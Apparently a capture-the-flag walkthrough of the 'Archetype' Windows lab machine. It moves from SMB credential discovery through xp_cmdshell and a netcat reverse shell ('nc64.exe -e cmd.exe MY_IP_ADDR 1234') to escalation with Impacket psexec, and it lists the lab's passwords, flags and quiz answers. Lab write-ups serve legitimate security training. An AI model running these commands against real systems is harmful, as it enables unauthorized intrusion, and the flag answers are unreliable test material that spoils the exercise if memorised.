# Archetype

> IP: [10.129.233.188]

## NOTES / STEPS

1. Deploy Machine
2. NMAP
   1. > nmap -sC -sV 10.129.233.188 -oN init_scan
      1. 135/tcp  -> msrpc        -> Microsoft Windows RPC
      2. 139/tcp  -> netbios-ssn  -> Microsoft Windows netbios-ssn
      3. 445/tcp  -> microsoft-ds -> Windows Server 2019 Standard 17763 microsoft-ds
      4. 1433/tcp -> ms-sql-s     -> Microsoft SQL Server 2017 14.00.1000.00; RTM

        ```text
            |_ssl-date: 2024-02-07T19:31:36+00:00; 0s from scanner time.
            | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
            | Not valid before: 2024-02-07T19:30:11
            |_Not valid after:  2054-02-07T19:30:11
            | ms-sql-ntlm-info: 
            |   10.129.233.188:1433: 
            |     Target_Name: ARCHETYPE
            |     NetBIOS_Domain_Name: ARCHETYPE
            |     NetBIOS_Computer_Name: ARCHETYPE
            |     DNS_Domain_Name: Archetype
            |     DNS_Computer_Name: Archetype
            |_    Product_Version: 10.0.17763
            | ms-sql-info: 
            |   10.129.233.188:1433: 
            |     Version: 
            |       name: Microsoft SQL Server 2017 RTM
            |       number: 14.00.1000.00
            |       Product: Microsoft SQL Server 2017
            |       Service pack level: RTM
            |       Post-SP patches applied: false
            |_    TCP port: 1433
            Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
        ```

    5. SMB

        ```text
            Host script results:
            | smb2-security-mode: 
            |   3:1:1: 
            |_    Message signing enabled but not required
            | smb-security-mode: 
            |   account_used: guest
            |   authentication_level: user
            |   challenge_response: supported
            |_  message_signing: disabled (dangerous, but default)
            | smb-os-discovery: 
            |   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
            |   Computer name: Archetype
            |   NetBIOS computer name: ARCHETYPE\x00
            |   Workgroup: WORKGROUP\x00
            |_  System time: 2024-02-07T11:31:28-08:00
            | smb2-time: 
            |   date: 2024-02-07T19:31:25
            |_  start_date: N/A
            |_clock-skew: mean: 1h36m00s, deviation: 3h34m41s, median: 0s
        ```

3. SMB
   1. Lets list the smb shares
      1. > smbclient -L 10.129.233.188

        ```text
            ADMIN$          Disk      Remote Admin
            backups         Disk      
            C$              Disk      Default share
            IPC$            IPC       Remote IPC
        ```

   2. Now lets connect to that backups share
      1. > smbclient \\\\10.129.233.188\\backups 
         1. > ls
            1. prod.dtsConfig
            2. This looks to be a production config file
            3. Looking through we see
               1. UN: ARCHETYPE\sql_svc
               2. PW: M3g4c0rp123
4. IMPACKET
   1. Doing some googling we see that Impacket is a collection of python classes to work with networking
   2. Looking through we see MICROSOFT SQL SERVER
      1. This uses: `mssqlclient.py`
   3. CONNECT
      1. > impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.233.188
         1. Couldn't connect
      2. > impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.233.188 -windows-auth
         1. SUCCESS! 
      3. MICROSOFT SQL SERVER
         1. Looking up procedures in mssql we see that `xp_cmdshell` can spawn a shell
   4. XP_CMDSHELL
      1. > xp_cmdshell
         1. ERROR: Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server.
      2. > help
         1. This shows us that we need to run "enable_xp_cmdshel"
      3. > enable_xp_cmdshel
      4. > RECONFIGURE
      5. > xp_cmdshell "whoami"
         1. RESPONSE: archetype\sql_svc
         2. SUCESS! We can now run commands or execute powershell commands
5. EXPLOIT
   1. First we need to get a revshell
      1. To do so we need to upload the netcat 64 binary
         1. Google nc64.exe and we download a copy
      2. Now we have the binary we need to create a simple server to host it
         1. > python3 -m http.server
      3. Now we need to craft a command to have the windows machine use powershell to "wget" the binary from our host machine
         1. STEPS
            1. Change dir to our sql_svc user
            2. Wget our nc64.exe binary
         2. > powershell -c cd C:\Users\sql_svc\Downloads; wget http://MY_IP_ADDR:80/nc64.exe -outfile nc64.exe
      4. Now we need to run our netcat binary
         1. > powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe MY_IP_ADDR 1234
            1. SUCCESS! We now have a reverse shell
      5. USERFLAG
         1. > cd Desktop
         2. > type user.txt
            1. `3e7b102e78218e935bf3f4951fec21a3`
6. ENUMERATION
   1. Now lets upload WINPeas
      1. > wget http://MY_IP_ADDR:8000/winPEASx64.exe -outfile winPEASx64.exe
   2. RUN WINPEAS
      1. File: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
      2. Lets go take a look at this file
         1. > cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\
         2. > type ConsoleHost_history.txt
            1. net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
            2. We see the admin username and password
7. ESCALATION
   1. Now that we have an admin user's credentials we can go back and use the Impacket - psexec tool to remote in
   2. IMPACKET
      1. > impacket-psexec administrator:'MEGACORP_4dm1n!!'@10.129.233.188
         1. > whoami
            1. nt authority\system
   3. Get FLAG
      1. > cd C:\Users\Administrator
         1. Looking around we find the root.txt in the admin's desktop
      2. > type root.txt
         1. `b91ccec3305e98240082d4474b848528`

## QUESTIONS

1. Which TCP port is hosting a database server?
   1. `1433`
2. What is the name of the non-Administrative share available over SMB?
   1. `backups`
3. What is the password identified in the file on the SMB share?
   1. `M3g4c0rp123`
4. What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?
   1. `mssqlclient.py`
5. What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?
   1. `xp_cmdshell`
6. What script can be used in order to search possible paths to escalate privileges on Windows hosts?
   1. `winpeas`
7. What file contains the administrator's password?
   1. `ConsoleHost_history.txt`
8. Submit user flag
   1. `3e7b102e78218e935bf3f4951fec21a3`
9. Submit root flag
   1. `b91ccec3305e98240082d4474b848528`
